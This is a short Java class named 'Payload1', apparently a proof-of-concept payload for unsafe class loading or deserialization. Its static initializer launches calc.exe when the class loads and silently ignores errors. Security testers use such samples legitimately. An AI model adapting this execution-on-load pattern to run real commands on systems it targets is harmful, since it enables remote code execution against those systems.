import java.lang.Runtime;
import java.lang.Process;
import java.util.ArrayList;

public class Payload1 extends ArrayList<Integer> {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pc = rt.exec("calc.exe");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
} }
}